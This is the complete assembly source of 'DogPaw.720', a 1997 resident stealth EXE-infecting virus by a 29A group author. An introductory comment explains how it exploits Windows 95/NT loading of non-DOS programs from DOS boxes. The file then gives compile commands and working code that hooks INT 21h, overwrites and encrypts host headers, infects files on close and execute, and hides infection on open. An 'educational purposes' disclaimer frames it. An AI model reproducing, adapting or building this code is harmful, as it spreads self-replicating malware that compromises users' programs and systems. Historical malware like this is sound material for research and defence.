;
;                                                ‹€€€€€‹ ‹€€€€€‹ ‹€€€€€‹
;          DogPaw.720                            €€€ €€€ €€€ €€€ €€€ €€€
;          by Jacky Qwerty/29A                    ‹‹‹€€ﬂ ﬂ€€€€€€ €€€€€€€
;                                                €€€‹‹‹‹ ‹‹‹‹€€€ €€€ €€€
;                                                €€€€€€€ €€€€€€ﬂ €€€ €€€
;
; This simple DOS virus exploits a certain feature graciosly implemented for
; us by Microsoft and which is present in Win95, WinNT and probably OS/2. It
; has to  do with non-DOS aplicationz run from  DOS boxez opened under these
; 32-bit systemz. It doesnt aply to Win3.1, tho.
;
; In Win3.1, whenever u try to execute  a Win3.1 aplication  from a DOS box,
; the  comon frustratin  mesage "This program  cannot be run in DOS mode" or
; "This program requires Microsoft Windows"  apeared.  The guyz at Microsoft
; always lookin for  enhancementz finaly made it right with NT and Win95 and
; wisely put an end to this nuisance. Under these 32-bit systemz, whenever u
; execute a non-DOS aplication  from a  DOS box, the system loader no longer
; executes the DOS stub program which displays such mesage, it actually ends
; up  executin the real Win3.1 or  Win32 aplication just as if u had double-
; clicked  the program on yer desktop to execute it. But what has this thing
; got to do with us? Can this feature be used in a virus? the answer is yes.
;
; I wrote this virus just to ilustrate how the above feature can be cleverly
; used in a virus.  For this reason,  DogPaw lacks all kindz of poly, retro,
; antidebug, etc. but it implements  full stealth tho,  and encrypts data of
; the original host, just to anoy AVerz a bit #8P. I'd like to thank "Casio"
; from undernet #virus as he seems to be the first one havin exploited this.
;
;
; Technical description
; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; DogPaw is a resident full stealth EXE infector of DOS, Win3.1, Win95, Win-
: NT and OS/2 programz. It infects filez on close and execute and disinfects
; them on open. I dont like this kind of stealth at all but it was more than
; necesary in order to exploit the forementioned feature.
;
; When DogPaw infects a file, it encrypts  the first  720 bytez of the host,
; includin its MZ header and stores it at the end of the file, then it over-
; writes the first 720 bytez of  the host with  the virus code itself, which
; is really DOS program code. This way what the virus really does is conver-
; tin Win3.1, Win95, WinNT  and OS/2 programz into  simple DOS programz con-
; tainin virus code.  This doesnt mean that such filez are trojanized or da-
; maged, they are fully functional after infection, read on.
;
; When a DogPaw-infected file is executed, the system treats it as a genuine
; DOS aplication. This is becoz the  virus overwrites the  pointer at 3Ch in
; the MZ  header which pointed to  the real NewEXE header (NE, PE, LX, etc).
; This way  the virus executes as a DOS 16-bit program and plants a resident
; copy in DOS memory. After this the virus has to execute the original apli-
; cation, be it a Win3.1, Win32 or an OS/2 program. For this purpose, it di-
; sinfects the host  by decryptin the original  data at the end  of file and
; writes it back  to the begin of file previosly overwriten with virus code.
; Next the virus executes the original host and, becoz of the above feature,
; the system finally executes  the original Win3.1, Win32 or OS/2 aplication
; just as if it had been executed from outside a DOS box.
;
; The disadvantagez of this method are plain to see. Microsoft obviosly dont
; want people to write clumsy DOS programz, tho it is still suportin old DOS
; aplicationz from inside its 32-bit systemz. This, acordin to Microsoft, is
; needed in order to make the migration from DOS to Win32 less painfully and
; troublesome. But once this DOS compatibility disapears from these systemz,
; those nonDOS programz infected by this virus wont be able to run or spread
; further from inside these 32-bit OS's. As u can see its not wise at all to
; still depend on obsolete goofie DOS in order to infect 32-bit aplicationz.
; For this purpose we must interact directly with the 32-bit file format, ie
; the PE format itself. There is no way to circumvent this in the future ;)
;
;
; A dog paw tale
; ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
; Some weekz ago i stole my dady's car to take a short ride around the block
; and  i was so nervous  that i almost crashed twice:  the first time with a
; huge big garbage truck  (yea even  tho i wear glasez)  and the second time
; with a little grandma crossin down the street.  Shit.. that was enough for
; the day, i didnt  want to kill anybody nor get killed at worst, so i deci-
; ded to go back home.  I turned on the radio and started to sing "the side-
; winder sleeps tonight" by R.E.M.  Yea i was havin a great time  even tho i
; had been about to crash twice.  Why did i have to open my mouth! Just when
; i was about to turn right at the next block i heard a suden "crash" follo-
; wed by two "squeeze.." "squeeze.." feelin two "up-and-down's" on the right
; tirez.  Shit what da hell was that..?  i looked back thru the front mirror
; just to know the answer. On the road i had left behind,  there lied a poor
; crushed dog.  Ohh shit i crushed a dog!  Now from  time to time  when that
; scene comes to my mind,  all i see is that unfortunate  squeezed dog wavin
; goodbye with his paw.. the poor dog paw. #8I
;
;
; Greetingz
; ƒƒƒƒƒƒƒƒƒ
; And finaly the greetingz go to:
;
;   Casio ......... Yer Rusty was kewl.. but throw 'way that ASIC dude!
;   Tcp/29A ....... Wooow! yer disasembliez rock man.. really rock!
;   Spanska ....... Dont get drunk too often ;) greetingz to Elvira..
;   Reptile/29A ... Not even a garden full of ganja can stop ya heh #8S
;   Rilo .......... Confess budie: Rilo Drunkie + Belch = Car crash ;)
;   Liquiz ........ Still watin to see that poly of yourz.. #8)
;
;
; Disclaimer
; ƒƒƒƒƒƒƒƒƒƒ
; This source code is for  educational purposez only. The author is not res-
; ponsible for any problemz caused due to the assembly of this file.
;
;
; Compiling it
; ƒƒƒƒƒƒƒƒƒƒƒƒ
; tasm -ml -m5 -q -zn dogpaw.asm
; tlink -t -x dogpaw, dogpaw.exe
;
;
; (c) 1997 Jacky Qwerty/29A.


.model  tiny
.286

include useful.inc
include MZ.inc

v_mark          equ     'GD'                         ;virus mark
v_size_bytes    equ     v_end - v_start              ;virus size in bytez
b_size_bytes    equ     v_size_bytes                 ;bufer size in bytez
s_size_bytes    equ     100h                         ;stack size in bytez
v_size_words    equ     (v_size_bytes + 1) / 2       ;virus size in wordz
v_size_paras    equ     (v_size_bytes + 15) / 16     ;virus size in paragraphz
v_size_sects    equ     (v_size_bytes + 511) / 512   ;virus size in sectorz
v_size_kilos    equ     (v_size_bytes + 1023) / 1024 ;virus size in kilobytez
v_size_div_512  equ     v_size_bytes / 512           ;virus size div 512
v_size_mod_512  equ     v_size_bytes    \            ;virus size mod 512
                        - (512 * v_size_div_512)     ;
m_size_bytes    equ     v_size_bytes + (b_start \    ;memory size in bytez
                        - v_end) + b_size_bytes \    ;
                        + s_size_bytes               ;
m_size_words    equ     (m_size_bytes + 1) / 2       ;memory size in wordz
m_size_paras    equ     (m_size_bytes + 15) / 16     ;memory size in paragraphz

.code
                org     100h
v_start:

MZ_Header       IMAGE_DOS_HEADER  <                     \ ;MZ header start
                        IMAGE_DOS_SIGNATURE,            \ ;MZ_magic
                        v_size_mod_512,                 \ ;MZ_cblp
                        v_size_sects,                   \ ;MZ_cp
                        0,                              \ ;MZ_crlc
                        0,                              \ ;NZ_cparhdr
                        m_size_paras,                   \ ;MZ_minalloc
                        m_size_paras,                   \ ;MZ_maxalloc
                        -11h,                           \ ;MZ_ss
                        (m_size_bytes + 111h) and -2    \ ;MZ_sp
                        v_mark,                         \ ;MZ_csum
                        entry_point,                    \ ;MZ_ip
                        -10h                            \ ;MZ_cs
                >

                org     (v_start + MZ_lfarlc)

old_MZ_low_ptr  dw      0
old_MZ_high_ptr dw      0

c_start:

Copyright       db      'D' xor 66h
                db      'o' xor 66h
                db      'g' xor 66h
                db      'P' xor 66h
                db      'a' xor 66h
                db      'w' xor 66h
                db      ' ' xor 66h
                db      'J' xor 66h
                db      'x' xor 66h
                db      'Q' xor 66h
                db      '/' xor 66h
                db      '2' xor 66h
                db      '9' xor 66h
                db      'A' xor 66h
                db       0  xor 66h

common_clean_ds:

                push    cs
                pop     ds
                mov     ds:[flag],al

common_clean:   test    al,?            ;clear carry (clean file)
                org     $ - 1

common_infect:  stc                     ;set carry (infect file)

                pusha
                mov     bp,offset clean + 1
                jnc     common
                mov     si,dx
                mov     bp,offset infect + 1
                cld
                @endsz
                std
                lodsw
                lodsw
                cld
                and     al,not 20h
                add     al,-'E'         ;check for EXE extension
                jnz     to_popa_ret
                lodsw
                and     ax,not 2020h
                add     ax,-'XE'
                jnz     to_popa_ret

common:         ;this function cleans or infects a file
                ;on exit:
                ;  flag = 0, if error

                mov     ax,3D00h
                call    call_int_21     ;open file in read/only mode
                jc      to_popa_ret
                xchg    bx,ax
                push    ds dx
                call    ptr2begin       ;move file pointer to begin of file
                jc      end_close
                push    cs
                pop     ds
                call    read            ;read first 720 bytez
                jc      end_close
                cmp     word ptr [si.MZ_csum],v_mark    ;check infection
                jnz     end_close_clc
                mov     ax,[si.MZ_magic]
                cmp     word ptr [si.MZ_maxalloc],m_size_paras
                jnz     end_close_clc
                add     ax,-IMAGE_DOS_SIGNATURE         ;check MZ signature
 end_close_clc: clc
     end_close: pushf
                mov     ah,3Eh
                call    call_int_21     ;close file
                pop     ax
                dec     bp
                lahf
                pop     dx
                or      al,ah
                shl     ah,4
                pop     ds
                xor     ah,al
                sahf
                jbe     end_popa_ret    ;if (carry or zero)

                mov     ax,4300h        ;save old file atributes
                call    call_int_21
   to_popa_ret: jc      end_popa_ret

                push    ds
                mov     si,4*24h-80h
                call    get_int
                pop     ds
                pusha                   ;ax, bx, si
                mov     bx,cs
                mov     ax,offset new_24
                call    set_int

                push    cx
                mov     cl,20h          ;set read/write file atributes
                mov     ax,4301h         
                call    call_int_21
                pop     cx
                jc      end_2popa_ret

                mov     ax,3D02h        ;open file in read/write mode
                call    call_int_21
                jc      restore_atrib

                pusha                   ;cx, dx
                xchg    bx,ax
                mov     ax,5700h        ;get data & time
                call    call_int_21
                jc      close_file

                push    ds es
                pusha

                push    cs cs
                pop     ds es
                mov     si,offset b_start
                lea     di,[si + old_MZ_low_ptr - v_start]
                call    bp              ;clean or infect
                jc      err_file
                mov     ds:[flag],al    ;al!=0 (check this while debugin)

      err_file: popa
                pop     es ds

                mov     ax,5701h        ;set data & time
                call    call_int_21
                
    close_file: mov     ah,3Eh          ;close file
                call    call_int_21
                popa

 restore_atrib: mov     ax,4301h        ;restore old atributes
                call    call_int_21

 end_2popa_ret: popa
                call    set_int

  end_popa_ret: popa
       end_ret: ret

infect          proc    ;infects a file

                mov     cx,b_size_bytes

                cld                     ;encrypt old MZ header
       encrypt: lodsb
                ror     al,cl
                xor     al,0C5h
                mov     [si-1],al
                loop    encrypt

                mov     ax,4202h        ;move file pointer to end of file
                cwd
                call    call_int_21
                jc      end_ret

                pusha
                call    write           ;write old MZ header to end of file
                jc      end_popa_ret

                lodsw                   ;move virus code to buffer area
                xchg    dx,di
                mov     si,offset v_start
                mov     ds:[old_MZ_Magic],ax
                cld
    move_virus: lodsb
                stosb
                loop    move_virus
                popa

                stosw                   ;hardcode file location in virus code
                xchg    ax,dx           ;
                stosw                   ;

                jmp     ptr2new         ;move file pointer to actual MZ header

infect          endp

get_int:        ;gets an interrupt vector
                ;on entry:
                ;  SI = int number * 4
                ;  DS = 0
                ;on exit:
                ;  DX:AX = int vector adress retrieved

                push    8
                pop     ds
                mov     bx,[si+2]
                mov     ax,[si]
                ret

clean           proc    ;cleans an infected file

                mov     cx,[di + 2]     ;old_MZ_high_ptr
                mov     dx,[di]         ;old_MZ_low_ptr
                pusha
                call    ptr2old         ;move file pointer to old MZ header
                jc      end_popa_ret

                call    read            ;read old MZ header
                jc      end_popa_ret

                cmp     word ptr [si.MZ_magic],1234h ;check old MZ header
   old_MZ_Magic =       word ptr $-2
                stc
                jnz     end_popa_ret

                cld                     ;decrypt old MZ header
       decrypt: lodsb
                xor     al,0C5h
                rol     al,cl
                mov     [si-1],al
                loop    decrypt

                popa
                call    ptr2old         ;move file pointer to old MZ header
                jc      ptr2new

                sub     cx,cx
                mov     ah,40h          ;remove old MZ header from end of file
                call    call_int_21

       ptr2new: call    ptr2begin       ;move file pointer to actual MZ header
                jc      end_clean

write:          mov     ah,40h          ;write MZ header
                cmp     ax,?
                org     $-2

read:           mov     ah,3Fh          ;read MZ header
                mov     dx,offset b_start
                mov     cx,b_size_bytes
                call    call_int_21
                jc      end_rd_wr
                cmp     ax,cx
                mov     si,dx
     end_rd_wr:

     end_clean: ret
     
clean           endp

entry_point:    mov     ax,30AFh
                x =     4*21h-80h
                push    x
                mov     di,offset old_int_21    ;check if already installed
                int     21h
                cld
                pop     si
                add     al,-0AFh
                mov     bp,si
                jz      already                 ;yea we're instaled, jump

                push    ds                      ;hook int 21h & stay resident
                call    get_int
                mov     [1+bp-x+si-x],ds
                stosw
                pop     ax
                xchg    ax,bx
                stosw
                mov     ax,offset new_int_21
                call    set_int

       already: push    di
                mov     ds,[2Ch+10h+bp-x]       ;get program filename
      get_prog: inc     si
                cmp     [si],bp
                jnc     get_prog
                lea     si,[si+4+bp-x]
                pop     dx
                @copysz

                call    common_clean_ds         ;clean infected program

exec:           cmp     al,ds:[flag]            ;prevent circular execution
                jz      exit
                push    ds
                mov     bx,offset p_block       ;execute program
                mov     ah,0Dh
                call    call_int_21
                mov     [bx+4],ds
                mov     [bx+8],cs
                pusha
                mov     [bx+0Ch],es
                mov     ax,4B00h
                call    call_int_21
                popa
                mov     ah,4Dh
                call    call_int_21
                pop     ds

                call    common_infect

exit:           mov     ah,4Ch          ;exit to DOS
                jmp     call_int_21

p_block         dw      0               ;parameter block to be used by 4B00h
                dw      80h
                dw      ?
                dw      5Ch
                dw      ?
                dw      6Ch
                dw      ?

new_24:         mov     al,3
                iret

ptr2begin:      xor     dx,dx           ;move file pointer to actual MZ header
                mov     cx,dx
ptr2old:        mov     ax,4200h
call_int_21:    pushf                   ;call old INT 21h
                push    cs
                call    jmp_int_21
                ret

set_int:        ;sets an interrupt vector
                ;on entry:
                ;  SI = int number * 4
                ;  DS = 0
                ;  DX:AX = int vector adress to store

                push    ds
                push    8
                pop     ds
                mov     [si+2],bx
                mov     [si],ax
                pop     ds
                ret

infect_on_close:                        ;infect on file close
                push    ds es
                pusha
                mov     bp,sp
                push    cs bx
                mov     ax,1220h
                int     2Fh             ;use file system tablez
                jc      fail_dcb
                mov     bl,es:[di]
                cmp     bl,-1
                cmc
                jc      fail_dcb
                mov     ax,1216h
                int     2Fh
      fail_dcb: pop     bx ds
                pushf
                mov     ah,3Eh
                call    call_int_21             ;close file
                mov     [bp.Pusha_ax],ax
                pop     ax
                jc      fail_close
                shr     al,1
                jc      fail_close_clc
                mov     ax,':'*100h + mask BDA_DriveNumber
                and     al,byte ptr es:[di.DCB_DeviceAtribs]
                mov     dl,al
                sub     al,-'A'
                mov     si,offset program_name + 3
                mov     [si-3],ax
                inc     dx
                mov     ah,47h
                call    call_int_21             ;get current directory
                jc      fail_close_clc
                cld
                dec     si              
                push    es si ds
                lea     si,[di.DCB_FileName]
                mov     al,'\'
                pop     es di
                stosb
                add     al,-'\' ; al=0
                scasb
                jnz     $ - 1
                sub     al,-'\' ; al='\'
                dec     di
                mov     cx,size DCB_FileName + 1
                cmp     al,[di-1]
                pop     ds
                push    si
                jz      $+3
     copy_name: stosb                   ;atach file name to path
                lodsb
                cmp     al,20h
                loopnz  copy_name
                pop     si
                mov     al,'.'
                mov     cl,size DCB_FileExt + 1
                sub     si,- size DCB_FileName
      copy_ext: stosb                   ;atach file extension to file name
                lodsb
                cmp     al,20h
                loopnz  copy_ext
                xor     al,al
                stosb
                push    cs
                pop     ds
                mov     dx,offset program_name
                call    common_infect   ;infect the file
fail_close_clc: clc
    fail_close: popa
                pop     es ds
                retf    2

      on_close: jmp     infect_on_close

self_check:     cmp     di,offset old_int_21
                jnz     jmp_int_21
                mov     si,di
                cld
                movs    word ptr es:[di],cs:[si]        ;copy old int 21h
                movs    word ptr es:[di],cs:[si]        ;
go_iret:        iret

new_int_21:     cli                     ;new INT 21h service routine
                push    ax              ;antitrace.. dont fuck with me
                push    -1
                inc     sp
                dec     sp
                pop     ax
                inc     ax
                pop     ax
                sti
                jnz     go_iret
        chk_3E: cmp     ah,3Eh          ;close?
                jz      on_close
        chk_30: cmp     ax,30AFh        ;are we already installed?
                jz      self_check
        chk_4B: cmp     ah,4Bh          ;execute?
                jnz     chk_3D
                call    common_infect
        chk_3D: cmp     ah,3Dh          ;open?
                jnz     jmp_int_21
                call    common_clean

jmp_int_21:     db      0EAh            ;JMP SEG:OFF opcode
v_end:                                  ;virus end on filez
old_int_21      dd      ?               ;old INT 21h vector

program_name    db      80h dup (?)     ;buffer to hold program namez
flag            db      ?               ;used to prevent circular execution
b_start:                                ;start of internal buffer
                end     v_start
